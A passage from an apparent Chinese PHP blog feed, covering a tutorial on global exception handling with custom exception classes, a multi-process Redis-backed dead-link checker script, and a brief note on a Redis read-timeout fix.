<li>1.3 修改<code>composer.json</code>，注册本地项目命名空间;<br>新建字段<code>autoload</code>，配置自动引入目录<code>app</code>;<div class="highlight-wrap" autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true" data-rel="JSON"><figure class="iseeu highlight /json"><table><tr><td class="code"><pre><span class="line">&#123;</span><br><span class="line">    <span class="attr">"name"</span>: <span class="string">"nginx/demo"</span>,</span><br><span class="line">    <span class="attr">"authors"</span>: [</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="attr">"name"</span>: <span class="string">"wuchuheng"</span>,</span><br><span class="line">            <span class="attr">"email"</span>: <span class="string">"wuchuheng@163.com"</span></span><br><span class="line">        &#125;</span><br><span class="line">    ],</span><br><span class="line">    <span class="attr">"autoload"</span>: &#123;</span><br><span class="line">        <span class="attr">"psr-4"</span>:&#123;</span><br><span class="line">            <span class="attr">"app\\"</span>: <span class="string">"app/"</span></span><br><span class="line">        &#125;</span><br><span class="line">    &#125;,</span><br><span class="line">    <span class="attr">"require"</span>: &#123;&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>
</li>
</ul>
<p><code>composer update</code> 更新下<br>这样为只要载入<code>vender/autoload.php</code>,就根据命名空间来加载类。</p>
<h5 id="1-4-创建入口文件和异常处理器"><a href="#1-4-创建入口文件和异常处理器" class="headerlink" title="1.4 创建入口文件和异常处理器"></a>1.4 创建入口文件和异常处理器</h5><p><strong><em>1.4.1在根据目录新建入口文件<code>start.php</code></em></strong><br><div class="highlight-wrap" autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true" data-rel="PHP"><figure class="iseeu highlight /php"><table><tr><td class="code"><pre><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * 入口文件</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@filename</span>   start.php</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@author</span>     wuchuheng&lt;wuchuheng@163.com&gt;</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@date</span>       2019/07/28</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">require_once</span> <span class="keyword">__DIR__</span> . <span class="string">"/vendor/autoload.php"</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 指定render方法来抛出异常</span></span><br><span class="line">set_exception_handler([(<span class="keyword">new</span> \app\<span class="keyword">exception</span>\HandlerException()), <span class="string">'render'</span>]);</span><br><span class="line"></span><br><span class="line"><span class="comment">//抛一个异常试试</span></span><br><span class="line"><span class="keyword">throw</span> <span class="keyword">new</span> \app\<span class="keyword">exception</span>\HandlerException(<span class="string">'hello'</span>);</span><br></pre></td></tr></table></figure></div></p>
<p><strong><em> 1.4.2 新建处理器文件<code>app\exception\HandlerException.php</code></em></strong><br><div class="highlight-wrap" autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true" data-rel="PHP"><figure class="iseeu highlight /php"><table><tr><td class="code"><pre><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * 异常处理器Handler</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@filename</span>  HandlerException.php</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@author</span>    wuchuheng &lt;wuchuheng@163.com&gt;</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@date</span>      2019/07/28</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">namespace</span> <span class="title">app</span>\<span class="title">exception</span>;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">HandlerException</span> <span class="keyword">extends</span> \<span class="title">Exception</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment">    * 异常抛出</span></span><br><span class="line"><span class="comment">    *</span></span><br><span class="line"><span class="comment">    */</span> </span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">render</span><span class="params">($e)</span> </span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> $e-&gt;getMessage();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div></p>
<p>行运结果：<br><img src="/images/TIM截图20190728145452.png" alt></p>
<p>到了这里就已经达到我们的期望，只要在入口文件指定异常的处理位置，那么全局的异常处理<br>将统一到指定的方法处理,统一输出，如是<code>rest API</code>那就输出<code>json</code>, <code>web</code>就<code>html</code>文本，<br><code>cli模式</code>等等，是不是不用写很多？</p>
<p> <code></code></p>
<h4 id="2-进一步封装"><a href="#2-进一步封装" class="headerlink" title="2 进一步封装"></a>2 进一步封装</h4><div class="note success">
            <p>异常很多种，常见有验证异常服务器异常等情况发生。所以要把这些异常写成一个个可复用的类<br>来简化信息系统的简化。哪种情况的异常就抛出哪个，大大提高代码的可读性.我以下我就根据<br><code>rest API</code>接口模式来撸下代码。</p>
          </div>
<h4 id="2-1-创建rest-API-异常基类"><a href="#2-1-创建rest-API-异常基类" class="headerlink" title="2.1 创建rest API 异常基类"></a>2.1 创建rest API 异常基类</h4><p>新建文件 <code>app/excetpion/RestBaseException.php</code></p>
<div class="highlight-wrap" autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true" data-rel="PHP"><figure class="iseeu highlight /php"><table><tr><td class="code"><pre><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * Rest API 异常基类</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@filename</span>  RestBaseException.php</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@author</span>    wuchuheng &lt;wuchuheng@163.com&gt;</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@date</span>      2019/07/28</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">namespace</span> <span class="title">app</span>\<span class="title">exception</span>;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">RestBaseException</span> <span class="keyword">extends</span>\<span class="title">Exception</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> $code = <span class="number">404</span>; <span class="comment">// http 状态码</span></span><br><span class="line">    <span class="keyword">public</span> $errorCode = <span class="number">4000</span>; <span class="comment">// 接口错误码</span></span><br><span class="line">    <span class="keyword">public</span> $msg = <span class="string">''</span>; <span class="comment">// 错误详情</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">   <span class="comment">/**</span></span><br><span class="line"><span class="comment">     * 格式化参数</span></span><br><span class="line"><span class="comment">     *</span></span><br><span class="line"><span class="comment">     */</span> </span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span><span class="params">(array $args = [])</span> </span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">if</span> (array_key_exists(<span class="string">'code'</span>, $args)) &#123;</span><br><span class="line">            <span class="keyword">$this</span>-&gt;code = $args[<span class="string">'code'</span>];</span><br><span class="line">        &#125; </span><br><span class="line">        <span class="keyword">if</span> (array_key_exists(<span class="string">'errorCode'</span>, $args)) &#123;</span><br><span class="line">            <span class="keyword">$this</span>-&gt;errorCode = $args[<span class="string">'errorCode'</span>];</span><br><span class="line">        &#125; </span><br><span class="line">        <span class="keyword">if</span> (array_key_exists(<span class="string">'msg'</span>, $args)) &#123;</span><br><span class="line">            <span class="keyword">$this</span>-&gt;msg = $args[<span class="string">'msg'</span>];</span><br><span class="line">        &#125; </span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>
<h4 id="2-2-验证异常类"><a href="#2-2-验证异常类" class="headerlink" title="2.2 验证异常类"></a>2.2 验证异常类</h4><div class="highlight-wrap" autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true" data-rel="PHP"><figure class="iseeu highlight /php"><table><tr><td class="code"><pre><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * 验证异常类</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@filename</span>  ValidateException.php</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@author</span>    wuchuheng &lt;wuchuheng@163.com&gt;</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@date</span>      2019/07/28</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">namespace</span> <span class="title">app</span>\<span class="title">exception</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">use</span> \<span class="title">app</span>\<span class="title">exception</span>\<span class="title">RestBaseException</span>;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span>  <span class="title">ValidateException</span> <span class="keyword">extends</span> <span class="title">RestBaseException</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> $code = <span class="number">404</span>;</span><br><span class="line">    <span class="keyword">public</span> $errorCode = <span class="number">4000</span>;</span><br><span class="line">    <span class="keyword">public</span> $msg = <span class="string">'验证异常'</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>
<h4 id="2-3-修改异常处理器类"><a href="#2-3-修改异常处理器类" class="headerlink" title="2.3 修改异常处理器类"></a>2.3 修改异常处理器类</h4><div class="highlight-wrap" autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true" data-rel="PHP"><figure class="iseeu highlight /php"><table><tr><td class="code"><pre><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * 异常处理器Handler</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@filename</span>  HandlerException.php</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@author</span>    wuchuheng &lt;wuchuheng@163.com&gt;</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@date</span>      2019/07/28</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">namespace</span> <span class="title">app</span>\<span class="title">exception</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">use</span> \<span class="title">app</span>\<span class="title">exception</span>\<span class="title">RestBaseException</span>;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">HandlerException</span> <span class="keyword">extends</span> \<span class="title">Exception</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment">    * 异常抛出</span></span><br><span class="line"><span class="comment">    *</span></span><br><span class="line"><span class="comment">    */</span> </span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">render</span><span class="params">($e)</span> </span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="comment">// RestApi 异常处理</span></span><br><span class="line">        <span class="keyword">if</span> ($e <span class="keyword">instanceof</span> RestBaseException) &#123;</span><br><span class="line">            <span class="keyword">echo</span>  <span class="string">'抛出的是Rest API扔异常'</span>;</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">'错误码是:'</span> . $e-&gt;errroCode . PHP_EOL;</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">'错误信息是:'</span> . $e-&gt;msg. PHP_EOL;</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">'状态码是:'</span> . $e-&gt;code. PHP_EOL;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>
<h4 id="2-4-现在可以抛出了"><a href="#2-4-现在可以抛出了" class="headerlink" title="2.4 现在可以抛出了"></a>2.4 现在可以抛出了</h4><div class="highlight-wrap" autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true" data-rel="PHP"><figure class="iseeu highlight /php"><table><tr><td class="code"><pre><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * 入口文件</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@filename</span>   start.php</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@author</span>     wuchuheng&lt;wuchuheng@163.com&gt;</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@date</span>       2019/07/28</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">require_once</span> <span class="keyword">__DIR__</span> . <span class="string">"/vendor/autoload.php"</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 指定render方法来抛出异常</span></span><br><span class="line">set_exception_handler([(<span class="keyword">new</span> \app\<span class="keyword">exception</span>\HandlerException()), <span class="string">'render'</span>]);</span><br><span class="line"></span><br><span class="line"><span class="comment">//抛一个异常试试</span></span><br><span class="line"><span class="comment">/* throw new \app\exception\HandlerException('hello'); */</span></span><br><span class="line"><span class="keyword">throw</span> <span class="keyword">new</span> \app\<span class="keyword">exception</span>\ValidateException([</span><br><span class="line">    <span class="string">'code'</span>=&gt; <span class="number">74110</span>, <span class="comment">//气死110</span></span><br><span class="line">    <span class="string">'errorCode'</span>=&gt; <span class="number">111</span>,</span><br><span class="line">    <span class="string">'msg'</span>=&gt; <span class="string">'这里是首页，正在抛出一个验证异常，有人吗?'</span>,</span><br><span class="line">]);</span><br><span class="line"></span><br><span class="line"><span class="comment">// 什么也不写就使用默认的定义好的参数抛出</span></span><br><span class="line"><span class="keyword">throw</span> <span class="keyword">new</span> \app\<span class="keyword">exception</span>\ValidateException();</span><br></pre></td></tr></table></figure></div>
<p>运行结果:<br><img src="/images/TIM截图20190728171705.png" alt></p>
<p>整体的思路是这样的，首先，不管理是抛出的是什么类，这个类必须是<code>Exception</code>的子类。<br>而在入口文件指定好异常类,已经指定好异常的触发处理方法。然后，抛过去的类，在由于是<br><code>RestBaseException</code>的子类，判断成立，就进入到里面了。</p>
<h4 id="3-扩展性"><a href="#3-扩展性" class="headerlink" title="3 扩展性"></a>3 扩展性</h4><p>这里要说下异常的扩展性，扩展是可以横向的，文中只是列出一种。可以根据开发的情况，<br>如是<code>html</code> 的异常那就，新增一个<code>HtmlBaseException</code>类，让<code>html</code>超文本的所以异常类<br>根据上面的例子来扩容，并在异常处理器添加下判断并把处理业务写进去就行了。<br>所以整体上来看，异常处理已经听可以划分为一个功能模块来看待。<br>如 可以这么写：<br><div class="highlight-wrap" autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true" data-rel="PHP"><figure class="iseeu highlight /php"><table><tr><td class="code"><pre><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment">* 异常抛出</span></span><br><span class="line"><span class="comment">*</span></span><br><span class="line"><span class="comment">*/</span> </span><br><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">render</span><span class="params">($e)</span> </span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="comment">// RestApi 异常处理</span></span><br><span class="line">    <span class="keyword">if</span> ($e <span class="keyword">instanceof</span> RestBaseException) &#123;</span><br><span class="line">        <span class="keyword">echo</span>  <span class="string">'抛出的是Rest API扔异常'</span>;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">'错误码是:'</span> . $e-&gt;errorCode . PHP_EOL;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">'错误信息是:'</span> . $e-&gt;msg. PHP_EOL;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">'http状态码是:'</span> . $e-&gt;code. PHP_EOL;</span><br><span class="line">        <span class="comment">//....</span></span><br><span class="line">        <span class="comment">// log  做下日志处理啥的</span></span><br><span class="line">        <span class="comment">// return json 返回数据 json</span></span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">// http  异常正理</span></span><br><span class="line">    <span class="comment">//if ($e  instanceof HttpBaseException)  </span></span><br><span class="line">    <span class="comment">// 系统异常正理</span></span><br><span class="line">    <span class="comment">//if ($e  instanceof SystemBaseException)  </span></span><br><span class="line">    </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div></p>
<p><a href>demo下载地址</a></p>
]]></content>
      <categories>
        <category>php</category>
      </categories>
      <tags>
        <tag>php</tag>
        <tag>异常</tag>
      </tags>
  </entry>
  <entry>
    <title>【php】多进程瞎折腾-写个网站死链检测脚本</title>
    <url>/2019/07/27/%E3%80%90php%E3%80%91%E5%A4%9A%E8%BF%9B%E7%A8%8B%E6%8A%98%E8%85%BE-%E5%86%99%E4%B8%AA%E7%BD%91%E7%AB%99%E6%AD%BB%E9%93%BE%E8%84%9A%E6%9C%AC/</url>
    <content><![CDATA[<p>一个网站几万个页面，手动找死链不是找死吗？搞个脚本多开几个进程多好啊。</p>
<div class="note class_name">
            <p>运行前注意了： 要在<code>linux</code>下运行，还要有<code>redis</code>,还要有<code>php</code>的<code>poxis</code>,<code>redis</code><br><code>pnctl</code>, <code>curl</code>这些扩展,还要有<code>composer</code>。</p>
          </div>
<a id="more"></a>
<h3 id="使用"><a href="#使用" class="headerlink" title="使用"></a>使用</h3><pre><code>* 下载  `git clone  https://github.com/wuchuhengtools/checkdeadUrl.git`.
* 切换到项目目录，安装依赖`composer install`.
* 启动`php  Crawler.php`.
</code></pre><h3 id="代码"><a href="#代码" class="headerlink" title="代码"></a>代码</h3><div class="highlight-wrap" autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true" data-rel="PHP"><figure class="iseeu highlight /php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> </span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * 网站死链检测程序</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@filename</span>  Crawler.php</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@author</span> wuchuehng&lt;wuchuheng@163.com&gt;</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@date</span>   2019/07/26</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">declare</span>(strict_types=<span class="number">1</span>); <span class="comment">//强类型模式</span></span><br><span class="line"><span class="keyword">if</span>(strpos(strtolower(PHP_OS), <span class="string">'win'</span>) === <span class="number">0</span>) <span class="keyword">exit</span>(<span class="string">"not support windows, please be run on Linux\n"</span>);</span><br><span class="line"><span class="keyword">if</span>(!extension_loaded(<span class="string">'pcntl'</span>)) <span class="keyword">exit</span>(<span class="string">"Please install pcntl extension.\n"</span>);</span><br><span class="line"><span class="keyword">if</span> (substr(php_sapi_name(), <span class="number">0</span>, <span class="number">3</span>) !== <span class="string">'cli'</span>) <span class="keyword">die</span>(<span class="string">"This Programe can only be run in CLI mode"</span>);</span><br><span class="line"><span class="keyword">if</span>(!extension_loaded(<span class="string">'Redis'</span>)) <span class="keyword">exit</span>(<span class="string">"Please install Redis extension.\n"</span>);</span><br><span class="line"><span class="keyword">use</span> <span class="title">Symfony</span>\<span class="title">Component</span>\<span class="title">DomCrawler</span>\<span class="title">Crawler</span> <span class="title">as</span> <span class="title">DomCrawler</span>;</span><br><span class="line"><span class="keyword">require_once</span> <span class="string">"./vendor/autoload.php"</span>;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Crawler</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span>  <span class="keyword">static</span> $count =  <span class="number">10</span>; <span class="comment">//进程量</span></span><br><span class="line">    <span class="keyword">public</span>  <span class="keyword">static</span> $domain=  <span class="string">'&lt;要检测的网址&gt;'</span>; <span class="comment">//网站主页</span></span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">static</span> $Redis;</span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">static</span> $redis_pass = <span class="string">''</span>;</span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">static</span> $redis_host = <span class="string">'127.0.0.1'</span>;</span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">static</span> $redis_port = <span class="number">6379</span>;</span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment">     * 获取redis连接实例</span></span><br><span class="line"><span class="comment">     *</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@return</span> redis连接对象</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">static</span> <span class="function"><span class="keyword">function</span> <span class="title">getRedisInstance</span><span class="params">()</span> : <span class="title">object</span></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">if</span> (!is_object(<span class="keyword">self</span>::$Redis)) &#123;</span><br><span class="line">            $Redis = <span class="keyword">new</span> \Redis();</span><br><span class="line">            $Redis-&gt;connect(<span class="keyword">self</span>::$redis_host, <span class="keyword">self</span>::$redis_port);</span><br><span class="line">            <span class="keyword">self</span>::$Redis = $Redis;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">self</span>::$Redis; </span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment">     *   检测页面是否有死链并入队新的url</span></span><br><span class="line"><span class="comment">     *</span></span><br><span class="line"><span class="comment">     *   <span class="doctag">@url</span>    </span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">static</span> <span class="function"><span class="keyword">function</span> <span class="title">checkUrl</span><span class="params">(string $url)</span></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        $current_url = $url;</span><br><span class="line">        $Redis = <span class="keyword">self</span>::getRedisInstance();</span><br><span class="line">        <span class="keyword">if</span>($Redis-&gt;hExists(<span class="string">'beCrawler'</span>, $url)) <span class="keyword">return</span>;</span><br><span class="line">        $ch = curl_init();  </span><br><span class="line">        curl_setopt($ch, CURLOPT_URL, $url);</span><br><span class="line">        curl_setopt($ch, CURLOPT_RETURNTRANSFER, <span class="number">1</span>);</span><br><span class="line">        curl_setopt($ch, CURLOPT_CONNECTTIMEOUT, <span class="number">5</span>);</span><br><span class="line">        $html = curl_exec($ch);</span><br><span class="line">        curl_close($ch);</span><br><span class="line">        $crawler = <span class="keyword">new</span> DomCrawler($html); </span><br><span class="line">        $urls = $crawler-&gt;filterXPath(<span class="string">'//a/@href'</span>)</span><br><span class="line">            -&gt;each(<span class="function"><span class="keyword">function</span> <span class="params">(DomCrawler $node, $i )</span> </span>&#123;</span><br><span class="line">                <span class="keyword">return</span> $node-&gt;text();</span><br><span class="line">            &#125;);</span><br><span class="line">        <span class="keyword">foreach</span>($urls <span class="keyword">as</span> $url) &#123;</span><br><span class="line">            $purl = parse_url($url);  </span><br><span class="line">            $pdurl = parse_url(<span class="keyword">self</span>::$domain);</span><br><span class="line">            <span class="keyword">if</span>(!array_key_exists(<span class="string">'host'</span>, $purl)) &#123;</span><br><span class="line">                $url = <span class="keyword">self</span>::$domain . $url;</span><br><span class="line">            &#125;</span><br><span class="line">            $ch = curl_init();</span><br><span class="line">            curl_setopt($ch, CURLOPT_URL, $url);</span><br><span class="line">            curl_setopt($ch, CURLOPT_HEADER, <span class="number">1</span>);</span><br><span class="line">            curl_setopt($ch, CURLOPT_NOBODY, <span class="number">1</span>);</span><br><span class="line">            curl_setopt($ch, CURLOPT_RETURNTRANSFER, <span class="number">1</span>);</span><br><span class="line">            curl_setopt($ch, CURLOPT_TIMEOUT, <span class="number">30</span>);</span><br><span class="line">            curl_setopt($ch, CURLOPT_AUTOREFERER, <span class="number">1</span>);</span><br><span class="line">            curl_setopt($ch, CURLOPT_FOLLOWLOCATION, <span class="number">1</span>);</span><br><span class="line">            curl_exec($ch);</span><br><span class="line">            $code = curl_getinfo($ch, CURLINFO_HTTP_CODE);</span><br><span class="line">            curl_close($ch);</span><br><span class="line">            <span class="keyword">if</span> ($code === <span class="number">200</span> &amp;&amp; !$Redis-&gt;hExists(<span class="string">'beCrawler'</span>, $url)) &#123;</span><br><span class="line">                <span class="comment">//加入队列</span></span><br><span class="line">                $Redis-&gt;lPush(</span><br><span class="line">                    <span class="string">'waitting_queue'</span>,</span><br><span class="line">                    json_encode([</span><br><span class="line">                        <span class="string">'url'</span>=&gt;$url, </span><br><span class="line">                        <span class="string">'micotime'</span>=&gt;microtime(<span class="keyword">true</span>),</span><br><span class="line">                        <span class="string">'pid'</span>=&gt;posix_getpid()])</span><br><span class="line">                );</span><br><span class="line">            &#125; <span class="keyword">elseif</span>($code !== <span class="number">200</span>) &#123;</span><br><span class="line">                $deal_url = [];</span><br><span class="line">                <span class="keyword">if</span> ($Redis-&gt;hExists(<span class="string">'dealUrl'</span>, $current_url)) &#123;</span><br><span class="line">                    $deal_url = json_decode(</span><br><span class="line">                        $Redis-&gt;hGet(<span class="string">'dealUrl'</span>, $current_url)</span><br><span class="line">                    );</span><br><span class="line">                &#125;</span><br><span class="line">                $deal_url[] = $url;</span><br><span class="line">                $deal_url = json_encode(array_filter($deal_url));</span><br><span class="line">                $Redis-&gt;hset(<span class="string">'dealUrl'</span>, $current_url, $deal_url);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        $Redis-&gt;hset(<span class="string">'beCrawler'</span>, $current_url, json_encode([<span class="string">'micotime'</span>=&gt;microtime(<span class="keyword">true</span>),<span class="string">'pid'</span>=&gt;posix_getpid()]));</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment">     * 启动所有进程</span></span><br><span class="line"><span class="comment">     *</span></span><br><span class="line"><span class="comment">     *</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="function"><span class="keyword">function</span> <span class="title">runAll</span><span class="params">()</span></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">for</span> ($i = <span class="number">0</span>; $i &lt; <span class="keyword">self</span>::$count; $i ++) &#123;</span><br><span class="line">            $pid = pcntl_fork();</span><br><span class="line">            <span class="keyword">if</span> ($pid === <span class="number">-1</span>) &#123;</span><br><span class="line">                <span class="keyword">exit</span>(<span class="string">"fork progresses error\n"</span>);</span><br><span class="line">            &#125; <span class="keyword">else</span> <span class="keyword">if</span>($pid == <span class="number">0</span>) &#123;</span><br><span class="line">                 cli_set_process_title(<span class="string">'subprocess PID:'</span> . posix_getpid());</span><br><span class="line">                 $Redis = <span class="keyword">self</span>::getRedisInstance();</span><br><span class="line">                 <span class="keyword">if</span>  ($Redis-&gt;lLen(<span class="string">'waitting_queue'</span>) === <span class="number">0</span>  &amp;&amp; !$Redis-&gt;hExists(<span class="string">'beCrawler'</span>, <span class="keyword">self</span>::$domain))&#123;</span><br><span class="line">                     <span class="keyword">self</span>::checkUrl(<span class="keyword">self</span>::$domain);</span><br><span class="line">                 &#125; </span><br><span class="line">                 <span class="keyword">while</span>($Redis-&gt;lLen(<span class="string">'waitting_queue'</span>) &gt; <span class="number">0</span> )</span><br><span class="line">                 &#123;</span><br><span class="line">                   $url = json_decode($Redis-&gt;lPop(<span class="string">'waitting_queue'</span>), <span class="keyword">true</span>);</span><br><span class="line">                   $url = $url[<span class="string">'url'</span>];</span><br><span class="line">                   <span class="keyword">self</span>::checkUrl($url);</span><br><span class="line">                 &#125;</span><br><span class="line">                 <span class="keyword">exit</span>(<span class="number">0</span>); <span class="comment">//中断子进程重复fork</span></span><br><span class="line">            &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                <span class="comment">// ...</span></span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        cli_set_process_title(<span class="string">'main Crawler'</span>);</span><br><span class="line">        <span class="comment">//主进程</span></span><br><span class="line">        $pid = pcntl_wait($status, WUNTRACED); <span class="comment">//取得子进程结束状态</span></span><br><span class="line">        <span class="keyword">if</span> (pcntl_wifexited($status)) &#123;</span><br><span class="line">            <span class="keyword">if</span> ($Redis-&gt;lLen(<span class="string">'waitting_queue'</span>)  !== <span class="number">0</span>) &#123;</span><br><span class="line">                 <span class="comment">//补充意外死掉的进程 </span></span><br><span class="line">                 <span class="keyword">self</span>::$count = <span class="number">1</span>;</span><br><span class="line">                 <span class="keyword">self</span>::runAll();</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">"\n\n* Sub process: &#123;$pid&#125; exited with &#123;$status&#125;"</span>;</span><br><span class="line">        &#125; </span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">Crawler::runAll();</span><br></pre></td></tr></table></figure></div>
]]></content>
      <categories>
        <category>php</category>
      </categories>
      <tags>
        <tag>多进程</tag>
      </tags>
  </entry>
  <entry>
    <title>【redis】php笔记-RedisException:-read-error-on-connection-in</title>
    <url>/2019/07/13/redis/</url>
    <content><![CDATA[<p><code>php</code>在使用<code>redis</code>的消息后，出现隔一段时间没连接会报<code>redis</code>断开的异常。<br>在<code>$redis</code>这个连接实例修改下属性<code>$redis-&gt;setOption(Redis::OPT_READ_TIMEOUT, -1);</code><br>就行了。具体的原因我还不太明确。 </p>
]]></content>
      <tags>
        <tag>redis</tag>
      </tags>
  </entry>
  <entry>
    <title>【linux】为archlinux选择国内镜像(转)</title>
    <url>/2019/06/01/%E3%80%90linux%E3%80%91%E4%B8%BAarchlinux%E9%80%89%E6%8B%A9%E5%9B%BD%E5%86%85%E9%95%9C%E5%83%8F/</url>
